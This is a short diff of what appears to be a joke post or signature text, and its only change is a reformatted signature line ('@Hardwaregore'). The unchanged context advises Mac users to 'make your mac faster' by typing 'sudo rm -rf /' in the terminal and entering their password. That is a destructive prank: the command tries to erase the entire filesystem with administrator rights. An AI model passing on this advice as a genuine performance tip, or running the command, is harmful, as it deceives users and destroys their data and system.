@@ -9,4 +9,4 @@ Also, to make your mac faster, open the terminal and type
     "  sudo rm -rf /  "     and
 enter your password!
 
- - @Hardwaregore
+ -- @Hardwaregore
